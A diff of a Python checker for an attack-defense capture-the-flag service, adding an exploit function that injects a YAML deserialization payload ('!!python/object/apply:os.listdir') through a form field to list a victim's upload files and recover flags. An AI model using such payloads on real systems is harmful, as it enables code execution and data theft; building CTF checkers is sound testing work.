@@ -6,6 +6,7 @@ import faker
 import secrets
 import re
 from hashlib import md5
+import binascii
 
 
 from typing import Optional
@@ -128,7 +129,7 @@ async def putflag_db(
 
     await db.set("userdata", (username, password, user_id))
     
-    return f"User: {username} ID: {user_id}"
+    return f"User: {username}" #ID: {user_id}"
 
 @checker.getflag(0)
 async def getflag_db(
@@ -199,7 +200,7 @@ async def putflag_api(
 
     await db.set("userdata", (username, password, user_id))
     
-    return f"User: {username} ID: {user_id}"    
+    return f"User: {username}"    
 
 @checker.getflag(1)
 async def getflag_api(
@@ -400,8 +401,6 @@ async def exploit_file_upload(task: ExploitCheckerTaskMessage,
                     client: AsyncClient,
                     logger:LoggerAdapter) -> Optional[str]:
     
-    print(task.attack_info)
-
     # reguster and login
     username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
     password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
@@ -445,30 +444,61 @@ async def exploit_file_upload(task: ExploitCheckerTaskMessage,
 
 
 
-#@checker.exploit(1)
-#async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-#    welcome = await conn.reader.readuntil(b">")
-#    conn.writer.write(b"user\n")
-#    await conn.writer.drain()
-#
-#    # TODO: Use flag hints
-#    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-#    for user in user_list:
-#        user_name = user.split()[-1]
-#        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
-#        await conn.writer.drain()
-#        await conn.reader.readuntil(b">")  # successfully registered
-#        await conn.reader.readuntil(b">")  # successfully logged in
-#        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-#        for note in notes_list:
-#            note_id = note.split()[-1]
-#            conn.writer.write(b"get %s\n" % note_id)
-#            await conn.writer.drain()
-#            data = await conn.reader.readuntil(b">")
-#            if flag := searcher.search_flag(data):
-#                return flag
-#    raise MumbleException("flag not found")
-#
+@checker.exploit(1)
+async def exploit_yaml_load(task: ExploitCheckerTaskMessage,
+                            searcher: FlagSearcher, 
+                            client: AsyncClient,
+                            logger:LoggerAdapter) -> Optional[str]:
+    
+    victim = task.attack_info.split(" ")[1]
+    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    age = random.randint(20,45)
+    gender = secrets.choice(["Male", "Female", "Other"])
+
+    data = {
+        "username" : username,
+        "password" : password,
+        "confirm_password" : password,
+        "age" : age,
+        "gender" : gender
+    }
+    register_res = await client.post("/register.php", data=data)
+    assert_response(logger,register_res,"Registration successful")
+
+    data = {
+        "username" : username,
+        "password" : password,
+    }
+    login_res = await client.post("/login.php", data=data, follow_redirects=True)
+    assert_response(logger, login_res, "Profile of")
+    
+    hashed_victim = md5(victim.encode()).hexdigest()
+    data = {
+    "username" : username,
+    "age" : age,
+    "gender" : gender,
+    "requested_username" : secrets.choice(["habibi", "habibti"]),
+    "punchline" : f"!!python/object/apply:os.listdir [\"uploads/{hashed_victim}\"]",
+    }
+
+    match_res = await client.post("/match.php", data=data)
+    assert_response(logger, match_res, "Data sent succesfully")
+
+    data = {
+        "username" : username
+    }
+    check_res = await client.post(f"/check_response.php", data=data)
+    flag_pattern = r"- (.+)\.yaml"
+    matches = re.findall(flag_pattern, check_res.text)
+    
+    for match in matches:
+        if not match.startswith("data"):
+            text = binascii.unhexlify(match).decode("utf-8")
+            if flag := searcher.search_flag(text):
+                return flag
+
+    raise MumbleException("flag not found")
 
 if __name__ == "__main__":
     checker.run()
